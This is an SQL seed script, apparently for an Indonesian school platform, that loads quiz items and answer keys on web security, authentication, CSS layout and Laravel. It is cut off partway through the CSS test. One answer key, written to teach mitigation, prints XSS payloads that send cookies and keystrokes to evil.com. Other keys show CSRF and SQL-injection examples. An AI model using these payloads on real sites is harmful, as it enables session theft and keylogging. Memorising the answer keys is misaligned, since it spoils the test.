-- ============================================================
-- Seed: Roadmap Kompetensi Kelas XI
-- 1 Kompetensi: Pemrograman Web Lanjutan (urutan 2, lanjutan dari mapel Pemrograman Web)
-- 6 Tes Kompetensi (5 PG 5-opsi + 2 Essay per tes)
-- Jalankan di Supabase SQL Editor
-- ============================================================

DO $$
DECLARE
  v_jur uuid;

  k1 uuid; -- kompetensi

  t1 uuid; -- Keamanan Web
  t2 uuid; -- Autentikasi & Otorisasi
  t3 uuid; -- UI Lanjutan
  t4 uuid; -- Pengenalan Laravel
  t5 uuid; -- Blade Templating
  t6 uuid; -- CRUD dengan Laravel

  s uuid;

BEGIN
  SELECT id_jurusan INTO v_jur
  FROM public.jurusan
  WHERE lower(nama_jurusan) LIKE '%rpl%'
     OR lower(nama_jurusan) LIKE '%pplg%'
     OR lower(kode_jurusan)  LIKE '%rpl%'
     OR lower(kode_jurusan)  LIKE '%pplg%'
  LIMIT 1;

  IF v_jur IS NULL THEN
    RAISE EXCEPTION 'Jurusan PPLG/RPL tidak ditemukan.';
  END IF;

  -- ----------------------------------------------------------
  -- KOMPETENSI
  -- ----------------------------------------------------------
  INSERT INTO public.kompetensi
    (id_jurusan, judul, deskripsi, tingkat, urutan, syarat_lulus, aktif)
  VALUES (v_jur,
    'Pemrograman Web Lanjutan',
    'Pendalaman pemrograman web meliputi keamanan web, autentikasi & otorisasi, UI lanjutan (Flexbox/Grid/animasi CSS), serta pengenalan framework Laravel: routing, Blade templating, dan operasi CRUD lengkap dengan database.',
    11, 2, 70, true)
  RETURNING id_kompetensi INTO k1;

  -- ----------------------------------------------------------
  -- KOMPETENSI_TUGAS
  -- ----------------------------------------------------------
  INSERT INTO public.kompetensi_tugas (id_kompetensi, judul, deskripsi, status)
  VALUES (k1, 'Keamanan Web',
    'Tes pemahaman ancaman keamanan web (XSS, CSRF, SQL Injection, IDOR) dan teknik mitigasinya dalam pengembangan aplikasi web.', 'aktif')
  RETURNING id_kompetensi_tugas INTO t1;

  INSERT INTO public.kompetensi_tugas (id_kompetensi, judul, deskripsi, status)
  VALUES (k1, 'Autentikasi & Otorisasi',
    'Tes pemahaman mekanisme autentikasi (session, JWT, cookie) dan otorisasi (role-based access control) dalam aplikasi web.', 'aktif')
  RETURNING id_kompetensi_tugas INTO t2;

  INSERT INTO public.kompetensi_tugas (id_kompetensi, judul, deskripsi, status)
  VALUES (k1, 'UI Lanjutan',
    'Tes kemampuan membangun antarmuka web responsif menggunakan CSS Flexbox, CSS Grid, animasi CSS, dan pendekatan mobile-first.', 'aktif')
  RETURNING id_kompetensi_tugas INTO t3;

  INSERT INTO public.kompetensi_tugas (id_kompetensi, judul, deskripsi, status)
  VALUES (k1, 'Pengenalan Laravel',
    'Tes pemahaman konsep dasar framework Laravel: routing, middleware, request lifecycle, Artisan CLI, dan struktur direktori proyek.', 'aktif')
  RETURNING id_kompetensi_tugas INTO t4;

  INSERT INTO public.kompetensi_tugas (id_kompetensi, judul, deskripsi, status)
  VALUES (k1, 'Blade Templating',
    'Tes kemampuan menggunakan Blade template engine Laravel: directive, layout inheritance, komponen, slot, dan kondisional/perulangan.', 'aktif')
  RETURNING id_kompetensi_tugas INTO t5;

  INSERT INTO public.kompetensi_tugas (id_kompetensi, judul, deskripsi, status)
  VALUES (k1, 'CRUD dengan Laravel',
    'Tes kemampuan membangun fitur Create-Read-Update-Delete lengkap menggunakan Laravel: route resource, controller, Eloquent, validasi, dan redirect dengan flash message.', 'aktif')
  RETURNING id_kompetensi_tugas INTO t6;

  -- ==========================================================
  -- TES 1: KEAMANAN WEB
  -- ==========================================================

  -- PG 1
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Serangan XSS (Cross-Site Scripting) terjadi ketika...',
    'pg', 'mudah',
    'XSS terjadi saat input dari pengguna ditampilkan kembali di halaman web tanpa di-escape/sanitasi, sehingga penyerang bisa menyisipkan skrip JavaScript berbahaya. Skrip tersebut berjalan di browser korban dan bisa mencuri cookie, session, atau melakukan aksi atas nama korban. Pencegahan: htmlspecialchars() di PHP, output escaping, Content Security Policy.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','Penyerang mengirim perintah SQL berbahaya melalui form input',false),
    (s,'B','Penyerang menyisipkan skrip berbahaya ke halaman web yang kemudian dieksekusi browser pengguna lain',true),
    (s,'C','Penyerang memaksa pengguna melakukan aksi yang tidak diinginkan di situs yang sudah login',false),
    (s,'D','Penyerang mencegat komunikasi antara client dan server',false),
    (s,'E','Penyerang mengakses resource yang bukan miliknya dengan mengganti ID di URL',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t1, s, 1, 10);

  -- PG 2
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Fungsi PHP yang digunakan untuk mengonversi karakter HTML spesial (< > " & '') menjadi HTML entity agar aman ditampilkan di halaman web adalah...',
    'pg', 'mudah',
    'htmlspecialchars() mengubah: & → &amp;, " → &quot;, '' → &#039;, < → &lt;, > → &gt;. Karakter-karakter ini tidak lagi diinterpretasikan sebagai HTML/JavaScript oleh browser, sehingga mencegah XSS. Selalu pakai ini saat menampilkan data dari user ke HTML. htmlentities() serupa tapi mengonversi lebih banyak karakter.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','strip_tags()',false),
    (s,'B','addslashes()',false),
    (s,'C','htmlspecialchars()',true),
    (s,'D','sanitize()',false),
    (s,'E','urlencode()',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t1, s, 2, 10);

  -- PG 3
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Serangan IDOR (Insecure Direct Object Reference) adalah serangan di mana penyerang...',
    'pg', 'sedang',
    'IDOR: penyerang mengakses resource milik user lain dengan mengganti identifier (ID) di URL/parameter tanpa validasi kepemilikan di sisi server. Contoh: /api/invoice/123 diganti jadi /api/invoice/124 untuk mengakses invoice orang lain. Pencegahan: selalu validasi apakah user yang request adalah pemilik resource tersebut.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','Menyisipkan kode berbahaya ke database melalui form',false),
    (s,'B','Mengirim request palsu seolah-olah dari user yang sudah login',false),
    (s,'C','Mengakses resource milik user lain dengan mengganti ID di URL tanpa otorisasi yang dicek server',true),
    (s,'D','Mencuri token autentikasi dengan menginjeksi JavaScript',false),
    (s,'E','Memaksa server mengirimkan file konfigurasi sensitif',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t1, s, 3, 10);

  -- PG 4
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'HTTP header yang digunakan untuk menginstruksikan browser bahwa sumber daya (script, style, gambar) hanya boleh dimuat dari origin yang diizinkan, sebagai mitigasi XSS adalah...',
    'pg', 'sulit',
    'Content-Security-Policy (CSP) header memberi tahu browser dari mana saja script/style/image boleh dimuat. Contoh: Content-Security-Policy: default-src ''self''; script-src ''self'' cdn.trusted.com. Ini mencegah XSS karena script dari sumber tidak terdaftar akan diblokir browser meski berhasil di-inject ke HTML.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','X-Frame-Options',false),
    (s,'B','X-XSS-Protection',false),
    (s,'C','Strict-Transport-Security',false),
    (s,'D','Content-Security-Policy',true),
    (s,'E','Access-Control-Allow-Origin',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t1, s, 4, 10);

  -- PG 5
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Atribut cookie yang membuat cookie tidak bisa diakses melalui JavaScript (document.cookie) sehingga mengurangi risiko XSS mencuri session adalah...',
    'pg', 'sedang',
    'HttpOnly flag pada cookie mencegah akses JavaScript ke cookie tersebut. Meski penyerang berhasil menyisipkan script XSS, script tidak bisa membaca session cookie. Secure flag memastikan cookie hanya dikirim via HTTPS. SameSite=Strict/Lax mencegah cookie dikirim dalam cross-site request (mitigasi CSRF). Gunakan ketiganya untuk cookie session.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','Secure',false),
    (s,'B','SameSite=Strict',false),
    (s,'C','HttpOnly',true),
    (s,'D','Expires',false),
    (s,'E','Path=/',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t1, s, 5, 10);

  -- Essay 1
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Sebuah aplikasi web sekolah memiliki halaman komentar di mana siswa bisa menulis komentar yang langsung ditampilkan ke semua pengunjung. Kode PHP yang digunakan saat ini:
<?php echo $_GET["komentar"]; ?>
(a) Jelaskan bagaimana penyerang bisa mengeksploitasi kode ini dengan serangan XSS! Buat contoh payload XSS yang konkret. (b) Apa dampak jika serangan berhasil? (c) Perbaiki kode tersebut agar aman dari XSS! (d) Jelaskan 2 lapisan pertahanan tambahan selain perbaikan kode!',
    'essay', 'sulit',
    'Jawaban ideal:

(a) Eksploitasi XSS:
URL dibuat oleh penyerang:
https://sekolah.id/komentar?komentar=<script>document.location=''https://evil.com/steal?c=''+document.cookie</script>

Saat korban mengklik URL tersebut, browser menjalankan script di dalam tag <script> sebagai bagian dari halaman sekolah.id.

Payload lain:
- Popup: <script>alert(''Anda diretas!'')</script>
- Keylogger: <script>document.onkeypress=function(e){fetch(''//evil.com?k=''+e.key)}</script>
- Redirect: <script>window.location=''https://phishing-sekolah.id''</script>

(b) Dampak:
- Pencurian session/cookie → penyerang login sebagai korban
- Pencurian data sensitif yang tampil di halaman
- Defacement halaman web
- Penyebaran malware ke pengunjung lain
- Phishing — redirect ke situs palsu

(c) Perbaikan kode:
// SALAH (rentan XSS):
<?php echo $_GET["komentar"]; ?>

// BENAR — escape output:
<?php echo htmlspecialchars($_GET["komentar"], ENT_QUOTES, "UTF-8"); ?>

// Atau simpan dulu ke DB dengan sanitasi:
$komentar = htmlspecialchars(trim($_POST["komentar"]), ENT_QUOTES, "UTF-8");
// ... simpan ke DB ...
// Saat ditampilkan:
echo htmlspecialchars($row["komentar"], ENT_QUOTES, "UTF-8");

(d) 2 Lapisan Pertahanan Tambahan:
1. Content Security Policy (CSP) Header:
   header("Content-Security-Policy: default-src ''self''; script-src ''self''");
   Browser memblokir script dari sumber tidak terdaftar, bahkan jika XSS berhasil di-inject.

2. HttpOnly Cookie:
   session_set_cookie_params(["httponly" => true, "secure" => true, "samesite" => "Strict"]);
   Meski XSS berhasil, script tidak bisa mencuri session cookie karena tidak bisa diakses via document.cookie.

Nilai penuh: payload XSS konkret (a) + 3 dampak (b) + htmlspecialchars dengan ENT_QUOTES + UTF-8 (c) + 2 lapisan tambahan dengan contoh kode (d).')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t1, s, 6, 25);

  -- Essay 2
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Jelaskan perbedaan antara XSS, CSRF, dan SQL Injection! Untuk masing-masing ancaman: (a) bagaimana cara kerjanya, (b) siapa yang menjadi korban utama (server/database/pengguna), (c) satu teknik mitigasi paling efektif. Kemudian, dari ketiga ancaman ini, menurut kamu mana yang paling berbahaya untuk aplikasi sekolah yang menyimpan data nilai siswa, dan mengapa?',
    'essay', 'sedang',
    'Jawaban ideal:

XSS (Cross-Site Scripting):
(a) Cara kerja: penyerang menyisipkan script jahat ke halaman web. Script dieksekusi di browser korban (user lain).
(b) Korban: pengguna/user (bukan server langsung) — cookie, session, data di browser dicuri.
(c) Mitigasi: htmlspecialchars() saat output + Content-Security-Policy header.

CSRF (Cross-Site Request Forgery):
(a) Cara kerja: penyerang membuat user yang sudah login di situs A untuk tanpa sadar mengirim request ke situs A dari situs B. Contoh: tag <img src="https://bank.com/transfer?to=hacker&amount=1000000"> di email.
(b) Korban: pengguna — aksinya (transfer, hapus data) dilakukan tanpa sepengetahuannya.
(c) Mitigasi: CSRF Token (token unik per form yang divalidasi server).

SQL Injection:
(a) Cara kerja: input berbahaya disisipkan ke query SQL, mengubah logika query. Contoh: username = admin'' --
(b) Korban: database/server — data bisa dibaca, diubah, atau dihapus seluruhnya.
(c) Mitigasi: Prepared Statement / PDO dengan binding parameter.

Yang paling berbahaya untuk aplikasi sekolah (data nilai):
SQL Injection paling berbahaya karena:
1. Bisa mengekspos SEMUA data nilai siswa sekaligus (SELECT * FROM nilai)
2. Bisa mengubah nilai siswa secara massal (UPDATE nilai SET nilai=100 WHERE 1=1)
3. Bisa menghapus seluruh database (DROP TABLE nilai)
4. Dampak langsung ke integritas data akademik — nilai yang dimanipulasi bisa mempengaruhi kelulusan, beasiswa, ijazah
5. XSS dan CSRF butuh korban yang sedang online; SQL Injection bisa dilakukan langsung dari request tanpa perlu user lain

Nilai penuh: 3 ancaman dijelaskan (cara kerja + korban + mitigasi masing-masing) + pilihan paling berbahaya dengan minimal 3 alasan konkret.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t1, s, 7, 25);

  -- ==========================================================
  -- TES 2: AUTENTIKASI & OTORISASI
  -- ==========================================================

  -- PG 1
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Perbedaan antara Autentikasi (Authentication) dan Otorisasi (Authorization) adalah...',
    'pg', 'mudah',
    'Autentikasi = verifikasi SIAPA kamu (identitas) — proses login, cek username+password. Otorisasi = verifikasi APA yang boleh kamu lakukan (hak akses) — setelah login, apakah user ini boleh akses halaman admin? Analogi: autentikasi = menunjukkan KTP di pintu (siapa kamu?), otorisasi = apakah kamu boleh masuk ruang VIP? Keduanya berbeda tapi saling melengkapi.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','Autentikasi menentukan hak akses; otorisasi memverifikasi identitas',false),
    (s,'B','Autentikasi memverifikasi identitas (siapa kamu); otorisasi menentukan hak akses (apa yang boleh kamu lakukan)',true),
    (s,'C','Keduanya sama — hanya istilah berbeda untuk proses login',false),
    (s,'D','Autentikasi untuk aplikasi web; otorisasi untuk aplikasi mobile',false),
    (s,'E','Otorisasi dilakukan sebelum autentikasi dalam alur keamanan',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t2, s, 1, 10);

  -- PG 2
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'JWT (JSON Web Token) terdiri dari tiga bagian yang dipisahkan titik. Bagian ketiga (Signature) berfungsi untuk...',
    'pg', 'sedang',
    'JWT: Header.Payload.Signature. Header = algoritma & tipe token (base64). Payload = claims/data (sub, exp, role) (base64). Signature = HMAC(base64(header) + "." + base64(payload), secret_key) — memastikan token tidak dimodifikasi. Server memverifikasi signature dengan secret key — jika payload diubah, signature tidak cocok dan token ditolak.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','Mengenkripsi data user agar tidak bisa dibaca tanpa kunci',false),
    (s,'B','Menyimpan informasi role dan permission user',false),
    (s,'C','Memverifikasi bahwa token tidak dimodifikasi sejak dibuat server',true),
    (s,'D','Menentukan kapan token kadaluarsa',false),
    (s,'E','Mengidentifikasi algoritma enkripsi yang digunakan',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t2, s, 2, 10);

  -- PG 3
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Kelemahan utama penyimpanan JWT di localStorage dibandingkan cookie HttpOnly adalah...',
    'pg', 'sulit',
    'localStorage dapat diakses JavaScript (window.localStorage) — jika ada celah XSS, script berbahaya bisa membaca dan mencuri JWT. Cookie HttpOnly tidak bisa diakses JavaScript sama sekali. Trade-off: localStorage lebih mudah dipakai di SPA/JS, tapi rentan XSS. Cookie HttpOnly lebih aman dari XSS tapi perlu proteksi CSRF (SameSite/CSRF token).')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','localStorage tidak bisa menyimpan string panjang seperti JWT',false),
    (s,'B','localStorage tidak persisten — data hilang saat browser ditutup',false),
    (s,'C','localStorage dapat diakses JavaScript sehingga rentan dicuri jika ada XSS',true),
    (s,'D','localStorage tidak kompatibel dengan semua browser modern',false),
    (s,'E','localStorage menyebabkan JWT kadaluarsa lebih cepat',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t2, s, 3, 10);

  -- PG 4
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Dalam sistem RBAC (Role-Based Access Control), hak akses ditentukan berdasarkan...',
    'pg', 'mudah',
    'RBAC: hak akses diberikan ke role (peran), bukan ke individual user. User diberi satu atau beberapa role. Contoh: role "guru" bisa input nilai; role "siswa" hanya bisa lihat nilai. Keuntungan: manajemen permission lebih mudah — ubah permission role, semua user dengan role itu ikut berubah. Alternatif: ABAC (Attribute-Based) atau DAC (Discretionary).')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','Identitas unik setiap pengguna (username/email)',false),
    (s,'B','Alamat IP pengguna saat mengakses sistem',false),
    (s,'C','Peran (role) yang dimiliki pengguna — semua user dengan role sama punya hak akses sama',true),
    (s,'D','Waktu dan tanggal pengguna pertama kali mendaftar',false),
    (s,'E','Jumlah login yang sudah dilakukan pengguna',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t2, s, 4, 10);

  -- PG 5
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Fungsi PHP yang digunakan untuk memverifikasi apakah password yang diinput user cocok dengan hash yang tersimpan di database adalah...',
    'pg', 'mudah',
    'password_verify($passwordInput, $hashDariDB) mengembalikan true jika cocok, false jika tidak. Ini pasangan dari password_hash(). Tidak perlu me-hash ulang input untuk dibandingkan — password_verify sudah menangani salt yang tersimpan dalam hash secara otomatis. Jangan pernah bandingkan password dengan == atau ===.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','password_check()',false),
    (s,'B','hash_compare()',false),
    (s,'C','password_verify()',true),
    (s,'D','md5_verify()',false),
    (s,'E','strcmp()',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t2, s, 5, 10);

  -- Essay 1
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Buatlah sistem autentikasi berbasis session PHP yang lengkap dengan fitur: (a) halaman login dengan validasi input dan proteksi CSRF, (b) verifikasi password menggunakan password_verify(), (c) penyimpanan data user di session setelah login berhasil dengan session_regenerate_id(), (d) middleware/guard function pengecekan session untuk halaman yang membutuhkan login, (e) fitur logout yang benar-benar menghapus session!',
    'essay', 'sulit',
    'Jawaban ideal:

// config.php — pengaturan session aman
<?php
session_set_cookie_params([
    "lifetime" => 7200,
    "path"     => "/",
    "secure"   => true,        // hanya HTTPS
    "httponly" => true,         // tidak bisa diakses JS
    "samesite" => "Strict",     // proteksi CSRF
]);
session_start();
?>

// (d) auth_guard.php — cek session untuk halaman protected
<?php
function requireLogin(): void {
    if (empty($_SESSION["user_id"])) {
        header("Location: /login.php");
        exit;
    }
}
function requireRole(string $role): void {
    requireLogin();
    if (($_SESSION["role"] ?? "") !== $role) {
        http_response_code(403);
        die("Akses ditolak.");
    }
}
?>

// login.php
<?php
require "config.php";

// Generate CSRF token
if (empty($_SESSION["csrf_token"])) {
    $_SESSION["csrf_token"] = bin2hex(random_bytes(32));
}

$error = "";

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // (a) Validasi CSRF
    if (!hash_equals($_SESSION["csrf_token"], $_POST["csrf_token"] ?? "")) {
        die("Request tidak valid.");
    }

    $username = trim($_POST["username"] ?? "");
    $password = $_POST["password"] ?? "";

    if (empty($username) || empty($password)) {
        $error = "Username dan password wajib diisi.";
    } else {
        // Ambil user dari DB dengan prepared statement
        $stmt = $pdo->prepare("SELECT id, username, password, role FROM users WHERE username = ?");
        $stmt->execute([$username]);
        $user = $stmt->fetch(PDO::FETCH_ASSOC);

        // (b) Verifikasi password
        if ($user && password_verify($password, $user["password"])) {
            // (c) Regenerasi session ID (cegah session fixation)
            session_regenerate_id(true);

            $_SESSION["user_id"]  = $user["id"];
            $_SESSION["username"] = $user["username"];
            $_SESSION["role"]     = $user["role"];
            unset($_SESSION["csrf_token"]); // buang token lama

            header("Location: /dashboard.php");
            exit;
        } else {
            $error = "Username atau password salah.";
        }
    }
}
?>
<form method="POST">
  <input type="hidden" name="csrf_token" value="<?= $_SESSION[''csrf_token''] ?>">
  <input name="username" required>
  <input name="password" type="password" required>
  <?php if ($error): ?><p><?= htmlspecialchars($error) ?></p><?php endif; ?>
  <button>Login</button>
</form>

// (e) logout.php
<?php
require "config.php";
// Hapus semua data session
$_SESSION = [];
// Hapus cookie session
if (ini_get("session.use_cookies")) {
    $p = session_get_cookie_params();
    setcookie(session_name(), "", time() - 42000, $p["path"], $p["domain"], $p["secure"], $p["httponly"]);
}
session_destroy();
header("Location: /login.php");
exit;
?>

// dashboard.php (halaman protected)
<?php
require "config.php";
require "auth_guard.php";
requireLogin();
echo "Selamat datang, " . htmlspecialchars($_SESSION["username"]);
?>

Nilai penuh: session cookie aman (httponly+secure+samesite) + CSRF token + password_verify + session_regenerate_id + requireLogin guard + logout benar (session_destroy + hapus cookie).')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t2, s, 6, 25);

  -- Essay 2
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Jelaskan perbedaan antara Session-based Authentication dan JWT-based Authentication! Tabel perbandingan dari segi: penyimpanan state, skalabilitas, keamanan, dan kasus penggunaan yang tepat. Kemudian implementasikan sistem otorisasi berbasis role sederhana dalam PHP di mana: admin bisa akses semua halaman, guru hanya bisa akses halaman nilai, siswa hanya bisa akses halaman belajar!',
    'essay', 'sedang',
    'Jawaban ideal:

PERBANDINGAN SESSION vs JWT:

Session-based:
- Penyimpanan state: state disimpan di SERVER (session store/database/Redis)
- Skalabilitas: lebih sulit di-scale (semua server harus bisa akses session store yang sama — shared state)
- Keamanan: session ID di cookie HttpOnly — aman dari XSS; perlu CSRF protection
- Logout: mudah (hapus session dari server)
- Cocok untuk: aplikasi web tradisional (monolith), skala kecil-menengah

JWT-based:
- Penyimpanan state: STATELESS — state di token yang dibawa client setiap request
- Skalabilitas: sangat mudah di-scale (server tidak perlu menyimpan state — any server bisa verifikasi token)
- Keamanan: jika di localStorage rentan XSS; di HttpOnly cookie lebih aman tapi perlu CSRF protection
- Logout: lebih kompleks (token masih valid sampai expired — perlu token blacklist/short expiry)
- Cocok untuk: REST API, microservices, SPA, mobile app, multiple platform

IMPLEMENTASI RBAC PHP:

<?php
session_start();

// Simulasi login — dalam aplikasi nyata dari DB
function login(string $username): void {
    $users = [
        "admin_sekolah" => "admin",
        "pak_budi"      => "guru",
        "andi_siswa"    => "siswa",
    ];
    if (isset($users[$username])) {
        session_regenerate_id(true);
        $_SESSION["username"] = $username;
        $_SESSION["role"]     = $users[$username];
    }
}

// Daftar permission per role
const ROLE_PERMISSIONS = [
    "admin"  => ["halaman_nilai", "halaman_belajar", "halaman_admin", "halaman_laporan"],
    "guru"   => ["halaman_nilai"],
    "siswa"  => ["halaman_belajar"],
];

function can(string $permission): bool {
    $role = $_SESSION["role"] ?? "guest";
    return in_array($permission, ROLE_PERMISSIONS[$role] ?? []);
}

function requirePermission(string $permission): void {
    if (!isset($_SESSION["user_id"])) {
        header("Location: /login.php"); exit;
    }
    if (!can($permission)) {
        http_response_code(403);
        echo "<h1>403 Forbidden</h1><p>Anda tidak punya akses ke halaman ini.</p>";
        exit;
    }
}

// Penggunaan di masing-masing halaman:
// halaman_nilai.php:
requirePermission("halaman_nilai");
echo "Halaman Nilai — hanya guru & admin";

// halaman_belajar.php:
requirePermission("halaman_belajar");
echo "Halaman Belajar — hanya siswa & admin";

// Di menu navigasi — tampilkan menu sesuai role:
if (can("halaman_admin")): ?>
  <a href="/admin">Panel Admin</a>
<?php endif;
if (can("halaman_nilai")): ?>
  <a href="/nilai">Input Nilai</a>
<?php endif; ?>

Nilai penuh: perbandingan 4 aspek (penyimpanan + skalabilitas + keamanan + kasus) + ROLE_PERMISSIONS array + can() + requirePermission() + penggunaan di halaman.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t2, s, 7, 25);

  -- ==========================================================
  -- TES 3: UI LANJUTAN
  -- ==========================================================

  -- PG 1
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Property CSS Flexbox yang digunakan untuk mengatur penyelarasan item secara vertikal (cross axis) dalam container flex adalah...',
    'pg', 'mudah',
    'align-items mengatur penyelarasan item di cross axis (tegak lurus main axis). Jika flex-direction: row (default), main axis = horizontal, cross axis = vertikal — maka align-items mengatur posisi vertikal. Nilai: flex-start, flex-end, center, stretch (default), baseline. justify-content untuk main axis (horizontal jika flex-direction: row).')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','justify-content',false),
    (s,'B','align-content',false),
    (s,'C','align-items',true),
    (s,'D','flex-align',false),
    (s,'E','vertical-align',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t3, s, 1, 10);

  -- PG 2
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'CSS Grid property yang digunakan untuk mendefinisikan jumlah dan ukuran kolom dalam grid container adalah...',
    'pg', 'mudah',
    'grid-template-columns mendefinisikan kolom grid. Contoh: grid-template-columns: 1fr 2fr 1fr (3 kolom, rasio 1:2:1), repeat(3, 1fr) (3 kolom sama lebar), 200px auto (kolom pertama 200px, sisanya otomatis), repeat(auto-fill, minmax(250px, 1fr)) (kolom responsive). grid-template-rows untuk baris.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','grid-columns',false),
    (s,'B','column-template',false),
    (s,'C','grid-template-columns',true),
    (s,'D','grid-column-count',false),
    (s,'E','columns',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t3, s, 2, 10);

  -- PG 3
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Pendekatan desain responsif "mobile-first" berarti...',
    'pg', 'sedang',
    'Mobile-first: tulis CSS untuk layar kecil (mobile) terlebih dahulu sebagai default, lalu tambahkan media query min-width untuk layar lebih besar (tablet, desktop). Keuntungan: performa lebih baik (mobile hanya load CSS yang dibutuhkan), memaksa prioritisasi konten penting. Kebalikannya desktop-first menggunakan max-width media query.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','Mendesain antarmuka khusus untuk aplikasi mobile, bukan website',false),
    (s,'B','Memulai desain dari layar terkecil (mobile) lalu memperluas ke layar lebih besar dengan min-width media query',true),
